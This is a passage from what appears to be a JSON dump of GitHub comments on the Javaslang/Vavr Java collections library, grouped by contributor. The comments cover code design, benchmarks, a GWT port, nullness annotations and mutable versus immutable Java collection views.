fluent.. Better would be to have this as a parameter in the enum constructor and add a getter - then the \ndefault:\n                throw new IllegalStateException(\"Unknown ContainerType: \" + containerType);\nCan't possibly occur. \n```\nenum ContainerType {\n    SET(\n            (Traversable<?> set, Object elem) -> ((Set<Object>) set).add(elem),\n            (Traversable<?> set, Object elem) -> ((Set<Object>) set).remove(elem),\n            HashSet::new,\n    )\n\n    ContainerType(BiFunction<Traversable<?>, Object, Traversable<?>> add,\n            BiFunction<Traversable<?>, Object, Traversable<?>> remove,\n             Supplier<Collection<?>> instantiator) {\n        this.add = add;\n        this.remove = remove;\n        this.instantiator = instantiator;\n    }\n\n    public Supplier<Collection<?>> getInstantiator() {\n         return instantiator;\n    }. Cuts out all the boilerplay code for `get`, `set` `hash` `equals` etc.\n\nIf I have a class like this:\n```java\n@EqualsAndHash\n@Getter\n@AllArgsConstructor\n@NoArgsConstructor\npublic class Foo {\nprivate String name;\nprivate Integer age;\n\n}\n```\nThen I get a class generated that has this:\nFoo f = new Foo(\"Christian\",1234);\nString name = f.getName();\nInteger age = f.getAge();\nSet<Foo> foos = HashSet.of(f);\nFoo baz = new Foo(\"Christian\",1234);\nSystem.out.println(foos.contains(baz)); // prints true because hash and equals are created\nThere are a lot of annotations. It really reduces code\n. @ruslansennov - it's a provided dependency. Which means, it doesn't go with the deployment artifact. Meaning it is functionally no dependency at all. If I didn't declare it as provided I should have. \nxml\n<dependencies>\n    <dependency>\n        <groupId>org.projectlombok</groupId>\n        <artifactId>lombok</artifactId>\n        <version>1.16.16</version>\n        <scope>provided</scope>\n    </dependency>\n</dependencies>\nRight from their page. ",
    "mduesterhoeft": "@danieldietrich think this could be closed?!. @ruslansennov you are right  it is interesting to also look at these results. With a list and the following traversal I get similar results:\nList<U> result = foldLeft(List.empty(), (acc, entry) -> acc.prepend(mapper.apply(entry._1, entry._2)));\nreturn result.reverse();\nCreated list with 100 entries in 129 ms\n    138 1.38    0.014\nTraverse after 145 ms\n    145 1.45    0.015\nSum is 333300 after 145 ms\n    146 1.46    0.015\nCreated list with 400 entries in 2 ms\n    2   0.005   0\nTraverse after 3 ms\n    3   0.007   0\nSum is 21333200 after 4 ms\n    4   0.01    0\nCreated list with 1600 entries in 3 ms\n    4   0.003   0\nTraverse after 8 ms\n    8   0.005   0\nSum is 1365332800 after 8 ms\n    9   0.006   0\nCreated list with 6400 entries in 9 ms\n    10  0.002   0\nTraverse after 14 ms\n    14  0.002   0\nSum is 87381331200 after 15 ms\n    15  0.002   0\nCreated list with 25600 entries in 24 ms\n    24  0.001   0\nTraverse after 34 ms\n    34  0.001   0\nSum is 5592405324800 after 35 ms\n    35  0.001   0\nCreated list with 102400 entries in 94 ms\n    94  0.001   0\nTraverse after 108 ms\n    108 0.001   0\nSum is 22073268555776 after 110 ms\n    110 0.001   0\nCreated list with 409600 entries in 452 ms\n    452 0.001   0\nTraverse after 528 ms\n    528 0.001   0\nSum is 16266472669184 after 541 ms\n    542 0.001   0\nSo which way would you recommend @ruslansennov @danieldietrich \n. @danieldietrich thanks for the suggestion and the help - I would like look at something more complex. So I am definitely eager to help with #1600 \n. @danieldietrich thanks for the hints - I will apply them and continue with the Multimap.\nI am from Hamburg so travelling to a meetup to Kiel I would just do if it is on Javaslang ;-)\n. @danieldietrich thank you for coaching. It was fun. Let me know if there is sth else I can help on.\n. My fault - sorry - I only saw that you assigned the issue after opened the PR. Please feel free to take your solution - I do not want to cause additional work.. For me just return map.containsKey(key) ? put(map, Tuple(key, value)) :  map; works.\nreturn map.containsKey(key) ? map.put(key, value) :  map; gives a compilation error.\nError:(244, 46) java: incompatible types: bad type in conditional expression\n    javaslang.collection.Map<K,V> cannot be converted to M\nI would rather use the first version and avoid the cast to M. Is that OK?\n. The tests for contains did not use a Multimap so the bug did not show in the tests.\n. I think contains on Multimap was broken - it should return true if one of the values is associated with the key? It that right\n. This is a little strange - isn't it - to avoid this we would need a custom toCompletableFuture in Try . ",
    "dharezlak": "@ruslansennov I also had to remove code using Object#wait()|notify() as these methods are not available in GWT. Also, some calls do not make sense on the client side such as Future#get()|isEmpty() as they use Java's notification mechanisms. One way to deal with this is to use GWT's replace mechanism which could use class implementations throwing exceptions for such cases (http://www.gwtproject.org/doc/latest/DevGuideCodingBasicsDeferred.html#replacement).\n. I'll try...\n. Where can I push the preliminary implementation?\n. @ruslansennov This is a preliminary implementation of what I had so far. I included the javaslang.concurrent package for the GWT compiller to minimize code duplicates for now and used guava as it provides super-source for a couple of classes from the java.util.concurrent package. Let me know how we should proceed with this. I am hoping to use it in 2.1.0 release :)\n. @danieldietrich I do not think that using JS native promise will gain us anything, we always operate in the browser's single-thread environment\n. @ruslansennov I did not manage to get to the bottom of the GWT test runs problem, just had a hunch for going with the recommended way of combining tests for the same module...\n. @danieldietrich One of the reasons for JS promises to exist is stepping out of the so called callback hell (http://callbackhell.com/).\n. @danieldietrich In principle all your points are valid. We could address the first point by reorganizing the project by moving super-sources to the javaslang-gwt module and start deploying it to maven. Users who wish to use it with GWT would point to the javaslang-gwt artifact which would transitively include the javaslang core artifacts (sources included).\nHowever, for the rest I don't see a clear approach at the moment. It's simply done this way for GWT libs.\nAnother issue worth mentioning here is super-source conflicts. When javaslang-gwt is used with another lib super-sourcing the same JDK classes (e.g. guava) they will be overwritten depending which lib is second in the GWT descriptor (*.gwt.xml files).\n. So, to summarize, we have the following todos:\n- [x] move everything GWT-related from javaslang core to javaslang-gwt (except the GwtIncompatible annotation),\n- [x] make the javaslang-gwt module dependent on the javaslang sources and make it maven-deployable,\n- [x] try to resolve potential guava conflicts for projects using both guava and javaslang-gwt (e.g. through providing different GWT descriptor files).\nWill these give us a green light towards 2.1.0 release?\n. @ruslansennov What should we do with the now removed JavaslangExample module?\n. Will do...\n. What happens to version management/releasing if the javaslang-gwt module is in a separate repository. Can this also be automated somehow?. @danieldietrich OK. I just want to make sure that the javaslang-gwt module will not be left behind. We are already addicted to it :). we shouldn't need it, I will make another commit...\n. Fixed\n. Checking...\n. Got it. It's used in the javaslang.concurrent.Future type.\n. Take a look at the proposed README changes I just committed.\n. ",
    "DanielGronau": "PR: https://github.com/javaslang/javaslang/pull/1619\n. Yes, this looks fine. BTW, do we need something similar for Traversable or so?\n. I'm not sure, but I could imagine that it is unexpected for a user that e.g. only the first value of a list is converted to an Option. So maybe we could have a second set of methods like allToOption, \nallToValidetc. on Traversable. \nBut on the other hand I agree that the API shouldn't be polluted by too much methods.\n. I did exactly that in Kotlin, and it works great, but for Java we have inheritance only. However, I think even this is still better than the cold naked Comparator - you can't even have a switch on a comparision result, which feels like stone age. Of course, as argument Vavr should still accept normal Comparators.\nI have an implementation in my own lib ( https://github.com/highj/highj/blob/master/src/main/java/org/highj/data/ord/Ord.java ), but it has some bells and whistles attached which are not necessary here.. Thank you for the detailed explanation!. ",
    "CauchyPeano": "Hi @danieldietrich , link is broken, where can I find article?. @danieldietrich following this broken links topic - there are also images links broken:\nThese are the results:\n![for-benchmark](/content/images/2016/10/for-benchmark-1.png). Hi @danieldietrich ,\nCan you maybe provide some examples how it should look like?\nDo you expect to have For() method on every monadic type?\n. thanks @danieldietrich for explanation!\nI'm still not sure what to do with\npublic static <T1> For1<T1> For(Iterable<T1> ts1)\nbecause there we no longer can use For1<> as result - Iterable is not a Value. Should we then remove those methods, and leave for Iterables only this one:\npublic static <T, U> Iterator<U> For(Iterable<T> ts, Function<T, Iterable<U>> f) ?\n. Hi @danieldietrich , i'm working on it. Don't you think that it's worth to lift in signatures Iterator to Traversable then?. @danieldietrich \nOh, spent plenty of time trying to figure out why new implementation was not working on List\n```Java\n   public static  For2 For(List ts1, List ts2) {\n        return new For2<>(Iterator.ofAll(ts1), Iterator.ofAll(ts2));\n    }\npublic static class For2<T1, T2> {\n    private final Iterator<T1> ts1;\n    private final Iterator<T2> ts2;\n    private For2(Iterator<T1> ts1, Iterator<T2> ts2) {\n        this.ts1 = ts1;\n        this.ts2 = ts2;\n    }\n    public <R> Iterator<R> yield(BiFunction<? super T1, ? super T2, ? extends R> f) {\n        Objects.requireNonNull(f, \"f is null\");\n        return\n            ts1.flatMap(t1 ->\n            ts2.map(t2 -> f.apply(t1, t2)));\n    }\n}\n\n```\nthen this test fails:\nJava\n       final List<Integer> result = For(\n            List.of(1, 2, 3),\n            List.of(1, 2, 3)\n        ).yield((i1, i2) -> i1 + i2).toList();\nResults in \nList(2,3,4)\nAs far as I understood it's because of mutable state of Iterator. First iterator could be consumed only once. But then I don't get why it was working before...  \n\nUpdate  So yes, it's because we save iterator as field. Before we were instantiating iterator every time inside flatMap call. \n. Ok, I'm returned from vacation+new job change process so want to finish this \ud83e\udd23 \ud83d\ude22 . @danieldietrich I was trying to recover where i've stopped last time. So right now it's not clear if we want to have flatMap on Value interface or not. From my prospective it would make sense. What do you think?. What kind of help needed here?. @danieldietrich what I see that HAMT from capsule is already included into benchmark io.vavr.collection.MapBenchmark\nRegarding BMT I couldn't find it in capsule library... Do I miss something?\n. @danieldietrich yeah, totally fine with me :) I was just puzzled if it's me that maybe don't understand something.. I've checked this one, so far as I understand left and right projections should be removed. As right-biased approach is already there and tested. Can I create PR with just removal of those subclasses and corresponding tests?. Hi @danieldietrich,\nso I am not sure after your conversation if you want to have those methods to be defined in Traversable or not. For me it looks also that map method should be enough.... Hi @danieldietrich, I think I have done it. \nCould it be merged?. What we have seen so far:\n```\nValidation:\nEither, T> toEither()\nValidation fromEither(Either either)\nValidation fromTry(Try t)\nEither:\nValidation toValidation()\nTry:\nEither toEither()\nOption toOption()\nOptional toOptional()\nValidation toValidation()\nValidation toValidation(Function throwableMapper)\nOption:\nOptional toOptional()\nTry toTry()\nTry toTry(Supplier ifEmpty)\n``\nFirstly I see that we have both ways to convert between Validation<->Try and Validation<->Either.\nFrom all discussions I suggest to keep only to* conversions methods and remove from* methods.. @Bill, I agree, but I want to say that it's too much to have duplicated conversion methods on the source type (e.g.Validation.fromEither(sourceEither)) and same conversion on target type (e.g.sourceEither.toValidation()`). It's worth to pick something one to make API consistent.\n@danieldietrich I've read that you want to minify current API footprint. Can you please confirm once more which methods you want to have and which ones not.. Hi @danieldietrich,\nThanks for looking into my PR! I understand your reasoning, but still have a feeling that this direction could be useful. I've actually implemented parser for my project using Validation and find this case of using Seq<> within validation not so rare. \nI've also introduced this not just by my use-case, but looking at this method: \nstatic <E, T> Validation<E, Seq<T>> sequence(Iterable<? extends Validation<E, T>> values)\nIt introduces into the play validation of sequences, and this concept seems to be reasonable part of validation class. That's why I think this was a logical step to start introducing following method. \n(It was also present in scalaz)\nThat's my opinion :)\nBest,\nIgor\n. Hi @danieldietrich, \nI agree, here we are bumping into java's limitations. I've also noted that it would make sense to have it not as static method, but it's not feasible\nThanks for explanation!. Yep, it's this one: https://github.com/vavr-io/vavr/issues/2183. Hi @danieldietrich,\nno problem. Reasoning is completely clear for me. Luckily change was not so big :) \nIf there any tickets which are bothering you and you need help with, I will be glad to work on them.\nCheers, \nIgor. Yeah, i've messed it somehow, I guess I will create new PR then?. Hi @danieldietrich,\nCool, I'm looking forward to continue helping here. . How do you think it will be possible to do this in current version of Java?. This one also intersecting with similar issue https://github.com/vavr-io/vavr/issues/2207. Hm, somehow now build for java8 is only failing. Can we restart this build?. Hi @danieldietrich ,\nNo need to excuse, I really appreciate your time. I've fixed that name. \nBtw how this relates to migration to gradle? I've realized that recently...\n. Hi @danieldietrich,\nthanks for answer. No worries, that PR was really small :) Can you please tell me where you need help next, because I am puzzled with current issues, because some of them not relevant anymore.\n. Good question... I was also not sure about it, so I've asked on StackOverflow \nhttps://stackoverflow.com/questions/54496735/is-there-practical-reasoning-to-enforce-jdk-version-for-build. Oops, is it done? or I will fix it...\nUPD.\nI've recovered a bit of my memory about that ticket. Actually removing this scope is not affecting artifact. compile is default scope for maven, so nothing changes here. What could be done - we need to add <optional>true</optional>  for vavr-match dependency. Ok, no problem :). ",
    "ldicarlo": "Link is now broken, new address is here : \nhttp://blog.vavr.io/the-agonizing-death-of-an-astronaut/\n. ",
    "cluelessjoe": "Hi @danieldietrich \nThanks a lot for your extensive and nice answer. :)\nI've read R\u00fanar Bjarnason's Functional Programming in Scala and there he doesn't introduce such a fold method, so it felt like your was just some short cut/convenience for foldLeft (and looking at the code felt so, for the ones like me missing the different signature of foldLeft). As you spotted, I'm truly clueless and proud of it ;) (well, I do with it rather to be honest lol)\nAnyway, glad it helped you improve the javadoc, it for sure helped me :) \nBTW, any plan for a parallel collection on your side? I haven't read of it, yet I would be very curious :)\nthanks again\nbest regards\n. ",
    "djspiewak": "Could this have anything to do with the new default methods encoding of traits?\n. Some random thoughts that may have no bearing on anything (and may have already occurred to everyone):\n- The new bytecode emitted may have pushed some functions just over HotSpot's inline limit, preventing certain optimizations which used to apply\n- The assembly produced by HotSpot in response to the new bytecode may be less amenable to whatever dark magic the CPU is doing.  I freely admit to being highly superstitious on this point\u2026\n- What do the heap profiles look like?  Presumably identical?\n- Have you tried enabling GenBCode on 2.11 to see if the same performance degradation is observed?\n- Exactly how much method defaulting is left in the code paths after converting the trait to an abstract class?  I'm not entirely sure how well the JVM's PIC interacts with method defaulting.  I would assume reasonably well, but I don't know the details.  Insert more superstitious mumbling here\u2026\n. ",
    "SethTisue": "@Ichoran is this expected?\n. may I suggest the discussion move to https://github.com/scala/scala-dev/issues/260?\n. ",
    "Ichoran": "This is not what I would have expected, @SethTisue.  I am not sure what is going on, but basically everything that has to create stuff is considerably slower.  The JVM has a really tough job to do with keeping track of what's valid with all the pointers into different depths of the vector; maybe that optimization is affected by the trait encoding?\nI could look into it starting this weekend if it's a high priority.  Otherwise, if someone wants to look at the generated assembly, that might give a clue.  I'd probably go for append as the easiest to understand.  They're all pretty hairy.\n. Oh, that was the GenBCode / inliner milestone!  I wonder if just looking at the bytecode would show what the difference is?\n. Could be.  I definitely benchmarked that, but I benchmarked it before the GenBCode change IIRC, and it's possible that I forgot to benchmark both with and without optimization.  That's a huge penalty for two equalities that ought to be false!\n. @viktorklang - It's marked @inline so I wasn't anticipating that the JVM would be responsible for inlining it!  I'm sure it's over the default (35 according to http://www.oracle.com/technetwork/articles/java/vmoptions-jsp-140102.html), but that shouldn't have mattered unless the Scala compiler isn't inlining it.\nYou might be right that the method calls to fetch the builder instances are at fault.\n. I don't know if there's an issue, but I'm looking into it.  So far I have not found any difference in bytecode or assembly that can explain the whole difference.  (Also, in my hands the difference is more like 50%.)  I did find that either switching VectorPointer to an abstract class (from a trait) or manually inlining all the code in it (so there is no default method) partially rescued the performance of :+.  But that was still only partial.\n. This is a tough one!  The bytecode is nearly identical (aside from the obvious differences); there is a big difference in profiling gotoPosWritable1, but the bytecode of that, despite being in different places, is essentially identical.  The assembly is, for some reason, a bit less efficient in 2.12, but it seems hard to believe that this is causing the entire slowdown.\nI'm going to try some speculative fixes, but I'm not terribly hopeful that any of them will work given that I still don't understand precisely what is causing the slowness.\n. @djspiewak - I mostly have been looking at assembly; the only glaring thing I've found is a failure to convert from a method call to a field access on some instances of fetching display0.  Still, it's hard to imagine that the slowdown could be so big just because of that.  It doesn't seem to be an inlining thing in general.\nAbout half the performance difference disappears when one converts the VectorPointer trait to an abstract class (plus various other changes that need to happen for that to work--and I'm not certain that the trait/abstract class change is the key one).  Also, about half the performance difference disappears if the VectorPointer has no default methods and the implementations are moved to the children.  I assume it's the \"same\" half, though obviously I can't easily check.\n. @paplorinc - Good question regarding the GC.  I don't have a good answer at this time.  It does suggest that I should be looking for an extra allocation in the bytecode, doesn't it?\nThis seems relatively Vector-specific, and there isn't a broad benchmark suite.  Maybe this is an indication that we should create one.\nWhat you've been doing has already been very helpful!  If you have time to bisect the commit history and figure out where the slowdown first happened, that would be awesome.  Looking for generalization (e.g. is HashMap affected?) might help too.  Or you may have other ideas that are better than either.\n. @paplorinc - Could you try the PR at https://github.com/scala/scala/pull/5516 to see if it fixes the issue in your benchmarks?  It does in my hands.\n. ",
    "mfejzer": "@danieldietrich I'll add narrow to (Checked)Function during next few days, probably on Monday. @danieldietrich I'm not sure if I understand covariance and contravariance correctly, but narrow defined on function should only work on result, right? Something like Function<? super T1, ? extends R> is \"narrowed\" to Function<? super T1,  R>, because we cannot cast ? super T1 to anything meaningful.. Yes, it makes sense, thanks. Sorry for not adding test in first commit\n. Hello, I've added static narrow methods to Tuple, is it approach acceptable or should I add narrow directly to each TupleN classes?. Thanks for review. Not ready - I accidentally created failing test. Thanks for review, I applied comments. Thanks for review. I've changed parameter name to f, should I change parameter name for lift also? . Fixed. Fixed, sorry I didn't notice, seems obvious. Fixed. Fixed. ",
    "udalrich": "Thanks for the pointer.  I had not seen it before.  (I think I'm used to package summary pages not having any useful information.)\n. ",
    "asarkar": "@danieldietrich Thank you. I suggest that you also explicitly say \"...is a no-op if the value is a Right\", or something to that effect. And at the same time, a similar phrase could be added to the map too.\n. I'd be happy to but do you really need contribution to add 35 characters? Perhaps 70, if map is updated as well.\n. Thank you.\n. @danieldietrich I stumbled across this thread from https://github.com/gradle/gradle/issues/5120, and after browsing 41cd78ff, have a couple of comments:\n\nIt seems like you're structuring the modules following the Gradle official documentation, which for some reason, uses a very convoluted project to demonstrate a complex idea, thus ending in a mess. For one thing, and I'm speaking from experience, having a build.gradle in every module creates code duplication, and makes it very difficult to see the big picture at once. A single build file is much easier to maintain.\nThe official recommendation is to name the module root directories the same as the modules, but you're not doing that. If my assumption is right that you followed the Gradle docs, then I see why not - they don't either. Conventions exist for a reason; why not follow them?\nI gather from the discussion here that vavr is not going to be JPMS-compatible overnight, but you can start by adding an Automatic-Module-Name attribute the MANIFEST.MF. That's the approach JUnit5 has taken, and I assume a lot of other libraries would too; it takes almost no effort on the maintainers' part.\n\nI've created a sample project for my own learning that implements suggestion 1 and 2 from above; you're welcome to check it out.\n. > It is just a convention that has no effect regarding the builds. Some do it, some not. It does not matter.\nThose that do it includes the JDK, so AFAIC, the rest of the lot doesn't matter; YMMV. The funny thing about conventions is as soon as you create one, some people feel compelled to violate them for no apparent reason :)\n\nGradle's current ext.moduleName workaround for the Automatic-Module-Name approach requires each submodule to have a separate build.gradle\n\nI suppose that's because your Gradle module names are not the same as the JPMS module names, hence you need a property. If those were the same, you could've just used the project name as the module name.\nThanks for maintaining the Vavr library, BTW, I use it extensively.. ",
    "mathieuancelin": "Hi Daniel,\nIt's okay, I understand your point and I can live without fold on Option :-) \nIt's just that I'm used to it in Scala, so it would have been nice to be able to use it on Javaslang's Option.\nIs there a place were I can discuss future pull requests with the team before writing them ? \nThanks for your answer\nMathieu\n. Ok, thanks\n. ",
    "victornoel": "hm yes, that makes sense!\nTo complete the discussion, I think there are JSR (I'm thinking of jsr305) that defines annotations for that (but I also think they were kind of abandoned\u2026 not sure if they plan to introduce one in jdk9, they wanted to for jdk8 then never did it\u2026).\nAnother point is that these annotations does not have to be there at runtime, so I don't know if it makes any difference to you\u2026 :)\nAnother option would be to ship some equivalent annotations and hope analysis tools base their analysis on annotation simple names instead of qualified names. I think findbugs does this, I know in eclipse you can configure many annotations for each concept (nullable, nonnul, etc), so it could be acceptable.\nLast option is not to include them and let people like me manually annotate them using external annotation mechanisms such as Eclipse's.. The checker framework is actually quite active, it is available at this URL: http://types.cs.washington.edu/checker-framework/\nFor nullness checking in javaslang, I was thinking more about stuffs like the static function provided by Either, Option, List, and so on: they all return non-null values (even if their content could be null in some cases). The same is true for modification operations such as List.append and others.\nUsually, you simply annotate your packages as non null by default and then fixes all the warning of the analysis tool until every special case is annotated.\nThe TODO function is quite nice! I'm going to use it :). The only interest of introducing nullness annotations is to play nice with analysers and IDEs so that they can better check user's code: clearly it won't bring anything to javaslang code for sure.. @io7m FYI, be careful not to mix annotations meant to be used at runtime for constraints validation on beans or user-originated stuffs like that (as the j2e ones or even those in hibernate validation) and those for static analysis used to find bugs in the code (all the others you cite).\nStill, what you observe is really a problem\u2026 even though I'm not really sure your yet another module is going to make things simpler ^^\nI think it would be best to choose one from the existing ones and I'm pretty sure what yours permits to express is covered by at least jsr305 and even maybe the eclipse's one, since it is possible to negate NonNullByDefault behaviour.. >> FYI, be careful not to mix annotations meant to be used at runtime for constraints validation on beans or user-originated stuffs like that\n\nYep, I did make that point in the documentation. None of the annotations have consistent retention semantics.\n\nWhat I meant by that is that you shouldn't even consider the validation annotations, and your annotations shouldn't be retained at runtime, it makes no sense in the context of static analysis.\n\nStill has issues in Intellij IDEA, unfortunately. You can't use a custom NonNullByDefault annotation and have to use Intellij's \"proprietary\" annotations instead to get the same effect.\n\nAh yes, the problem with the meta annotations from jsr305, there is the same problem with the Eclipse way of manipulating annotations and the need for using eclipse's annotations.. pfff, they are terrible :)\nAnother place where this a lot of discussion on the matter: http://stackoverflow.com/questions/4963300/which-notnull-java-annotation-should-i-use\n. I don't really agree with your reasoning @danieldietrich :)\nI believe the need exists for annotating methods with nullness information, whatever is the library, as long as users are using nullness analysers and IDE with such feedbacks (you should try such facilities, it's really useful, but terrible to use when you get warnings everywhere because the libraries you use are not annotated).\nI agree that solving this need is problematic, especially with the \"15 standards\" situation ^^ so I agree with the conclusion that it's too much hassle to do it for javaslang for now.\nBut if there was a unique standardized way of annotating nullness provided by the JDK, I really think it would be useful to have javaslang annotated!\nFYI I personally started using the external annotations facilities of Eclipse to annotate what I use of javaslang for my needs.\nAnd btw, they didn't deprecate the annotation in scala, but a trait (like an interface with defaults). I don't even think scala has such annotations\u2026. > TL;DR: YAGNI! So, why not just disable your IDE warnings for all Javaslang API usage? :)\nGood idea actually, didn't think of that :). ",
    "mp911de": "Too bad I didn't see this discussion earlier. I'm referring to\n\nthe dark side of the moon. We will stay on the light side.\n\nwhich I feel should be clarified a bit. I think this can cause misunderstanding so let me try to dig into that topic.\nFrom our perspective, we sometimes see the moon entirely, partially or we don't see it at all. This is due to lunar phases. If we dig a bit more into detail, we'll discover there's no such thing as the dark side or light side of the moon. There are two things that play into the issue. \n\nThe moon is not a perfectly sphere with a perfect mass/gravity distribution - with every point on its surface equidistant from its center. The shape of the moon is that of an oblate spheroid, meaning it has the shape of a ball that is slightly flattened. This causes earth's gravity to pull over time on the most massive parts which slow down moon's rotation. This happened over a very long time which caused the moon to be tidally locked to the earth. Because of conservation of angular momentum, the moon tries to rotate, but earth's gravity applies a torque which causes the moon to align with the side we see right now.\n\n\n\nThe moon still rotates, but it does it only once per each revolution around the earth (about once every 27.3 days). The moon's orbit and rotation around the earth are causing what we call lunar phases. With the rotation around the earth, we are only able to see a certain part of the moon illuminated by the sun. One side of the moon is always illuminated, but we aren't able to see always the whole illuminated side. A full moon from our perspective is when the moon is right behind the earth (as seen from the sun or called opposition). At half moon we see the moon from the side and if we don't see the moon (new moon) the moon is right between the earth and the sun (or called inferior conjunction).\n\n\nTL; DL:\n\nThere are only a near side and a far side of the moon. \nEach side gets the same amount of light over the period of rotation.\nWe are just not able to see it from our perspective.\n\nReferences: \n https://en.wikipedia.org/wiki/Orbit_of_the_Moon\n https://en.wikipedia.org/wiki/Lunar_phase\n* https://www.youtube.com/watch?v=j91XTV_p9pc. ",
    "stephenc": "Just a quick note on JSR-305 annotations...\nThe oracle JRE redistribution terms expressly declare that only java and/or javax released through the JSR process may be included with the entire distribution if you are redistributing a JRE.\nIt is unclear whether this prevents redistribution of class files that include annotation references to annotations within the java or javax packages, so this may not affect everyone...\nBut TL;DR if you bundle a JRE you must ensure that the jar claiming to be JSR-305 annotations is excluded as that JSR has not had an official release. ",
    "pgpx": "I use the annotations as a nice clear and consistent form of documentation.  Generally nullness (along with thread safety and immutability) is not documented (at least at the method level, e.g. getOrElse does not explicitly state that other can be null).  If you specify these annotations then you are making it explicit that you (as the class author) have considered and documented nullness (in a hard-to-miss manner).. Oh, that does make sense.  I guess I'm too used to working with legacy code that has little to no Javadoc, in which case adding some nullness annotations is a quick way of helping my understanding (but arguably should also/instead involve better documentation and/or migrate to Optional/non-null collections, etc).  That doesn't apply to Javaslang anyway, so you shouldn't have to add non-standard annotations as well (and analysis tools could/should support separately defining the nullness of 3rd party libraries anyway without modifying their code).. ",
    "iref": "I can work on this issue if nobody started yet. I checked how Scalacheck handles this and they filter all generators without positive frequency out before they compute composite generator. Should we do the same thing? Or do you think that throwing IllegalArgumentException, which is case for negative frequencies now, is better?. ",
    "ravn": "You should not use sneaky throws as it wrecks the Java design, and is highly frowned upon by the Java architect(s?).  . Please revert to proper handling.  It can most likely be done simply by storing the exception in a Throwable (without having looked at the code) and moving forward.. ",
    "seanf": "There's some similar code in Dexx Collections which may or may not be useful: https://github.com/andrewoma/dexx/tree/master/collection/src/main/java/com/github/andrewoma/dexx/collection/internal/adapter. I was just thinking the standard throw new UnsupportedOperationException approach, as taken by the immutable wrappers in the JDK[1], Guava immutable collections[2] and Scala[3]. It's not pretty, but it is documented behaviour for the Java collections - \"Throws: UnsupportedOperationException - if the put operation is not supported by this map\"[4].\nIf someone wants to get a mutable Java Map out of a Javaslang Map, that's what toJavaMap() is for - in most cases mutations would probably far more efficient with a standard java.util.HashMap than a tricksy delegating implementation. Except in cases where the initial copy is expensive and there are few mutations afterwards. But I think that would be a less common use case.\n[1] https://docs.oracle.com/javase/8/docs/api/java/util/Collections.html#unmodifiableMap-java.util.Map-\n[2] https://google.github.io/guava/releases/snapshot/api/docs/com/google/common/collect/ImmutableList.html#add-int-E-\n[3] http://docs.scala-lang.org/overviews/collections/conversions-between-java-and-scala-collections.html\n[4] https://docs.oracle.com/javase/8/docs/api/java/util/Map.html#put-K-V-. I'm not suggesting a change to the existing method toJavaMap(), just to add a new method.\n\nasJavaMap() -> view as immutable java.util.Map\n\ntoJavaMap() -> copy contents to java.util.HashMap. But for a future Javaslang API, I suppose it would be possible to remove the toJava* methods if desired. The standard Java collections can easily be constructed (by copying) from another collection, like this:\njava.util.Map myMutableMap = new java.util.HashMap<>(myJavaslangMap.asJavaMap());\n\n\nBut it might be better to have both methods, to make it more obvious that the view is immutable.\nNow I'm thinking asJavaMap() should be called asImmutableJavaMap(). That should make it obvious.. > Throwing is no good idea, it will lead to endless suffer. We should implement the mutating methods.\nThere might be a use case for that too, but there's a reason people use Guava's ImmutableList etc, despite the impurity of \"optional\" mutation methods. Sometimes you just want it to be an immutable list. OTOH if you want a mutable list, you should start with one of the many mutable list implementations, not an immutable one. (Or call toJavaList() to make a mutable copy.)\nScala does throw if you convert an immutable collection and then call a mutator method: http://docs.scala-lang.org/overviews/collections/conversions-between-java-and-scala-collections.html\n. I'm just pointing to Guava because I see an important use case for immutable java.util.Lists, and so did Google. (Some of their reasoning here: https://github.com/google/guava/wiki/ImmutableCollectionsExplained)\nI guess I also think creating another (much less efficient) form of mutable list is a lot of effort (and perhaps maintenance complexity) for very limited value.  I like immutable objects. Being able to say this java.util.List is \"the same\" as that javaslang List is very useful. Once you introduce mutability, that might not be true for long. Just because you can implement the optional mutation methods doesn't mean you must, or should.\nI assume javaslang's Iterator.remove() throws UnsupportedOperationException? It's ugly, but sometimes ugly APIs force that on you.\nFor me as a new user, I use javaslang collections for their immutability. (I've been looking for a good, well-documented persistent collection in Maven Central for quite a while.) If I need to view such a javaslang collection as a Java collection, it's for interop, not because I wish I had created a mutable collection.\nIf you implement a mutable java.util.List view of a javaslang immutable List, will you also be creating a javaslang.MutableList (view) for completeness? The java.util interfaces have a few warts, and they don't have all the nice javaslang methods.\nI'm not saying there's no use case for mutable views of immutable collections. In a way, they ~remind me of Clojure's refs, and~ seem like a clever idea. But maybe they aren't a core feature for a library which (to me) is about immutable collections, and could instead live outside the javaslang core.\nYes, Collections.unmodifiable* is an option. I think it would be friendlier if the immutable view were available directly from the javaslang collection methods though. (Especially since I think the immutable collection is the truer representation of the javaslang collection, although I'm apparently alone in that view. The possibility of unwanted exceptions is just an unfortunate consequence of the optional methods in the Java Collections API.)\nNote that adding an unmodifiable wrapper may make it difficult or impossible to emulate Scala's ability to give you the same Java List every time you convert a Scala/Javaslang list, or to do round-trip conversions. http://docs.scala-lang.org/overviews/collections/conversions-between-java-and-scala-collections.html\nIn any case, if you're willing to break from Scala precedents where it makes sense, I think trying to make a Seq look like a List (despite the big differences in performance guarantees for some operations) is a Scala mistake which should not be emulated.. On 6 December 2016 at 22:46, Daniel Dietrich notifications@github.com\nwrote:\n\n@emmanueltouzery https://github.com/emmanueltouzery Thank you for your\nfeedback. The conversion methods toJava*() will stay with us. What we\nneed to know is if it would help in a real-life application to have a way\nto additionally create mutable views.\n// Takes new mem by creating a new ArrayList and copying all elements in O(n).// As a result, operations on that List are the same as those of ArrayList.\ntoJavaList()\n// Additional method. creates a List in O(1) by providing a wrapper around a persistent collection.// As a result, operations on that List are the same as those of the underlying persistent collection.\nasJava()\nI think it's very important that the method names make a clear distinction\nbetween the mutable version and the immutable version, to minimise\nsurprises.\n\nIn fact, at the risk of taking things too far (or too far off track), I\nwonder if it's a good idea to add an ImmutableList interface which would\nlook a bit like Guava's ImmutableList class:\nhttps://google.github.io/guava/releases/snapshot/api/docs/com/google/common/collect/ImmutableList.html\nBasically It would just extend java.util.List, but with deprecation\nwarnings on the mutation methods.\n(In my own experience with Guava, I sometimes use deliberate references to\nGuava's ImmutableList, to help keep straight mutable versus immutable\nlists. It's certainly not a guarantee because an ImmutableList is still a\nList, but it does help a little, just as a form of documentation.)\nIf the user just assigns the result to a java.util.List variable, this\ninterface will be useless, naturally. But if the object is assigned to a\nvariable of type javaslang.jcollection.ImmutableList (which IDEs would\noffer to do automatically in various situations, eg \"create local\nvariable\"), this may help to remind the user that this is a special\nimmutable list, and that mutator methods should be avoided.\nWhat do you think? Would you propagate a mutable view to the outside or\n\ncopy a collection instead?\n\n\nSo far I've just been using toJava* when mutation was required, and it was\nperfectly fine in that particular situation.\nBut are you asking whether the existing method toJava should switch from\ncopying, to providing a mutable view? Given the performance differences, I\ndon't think 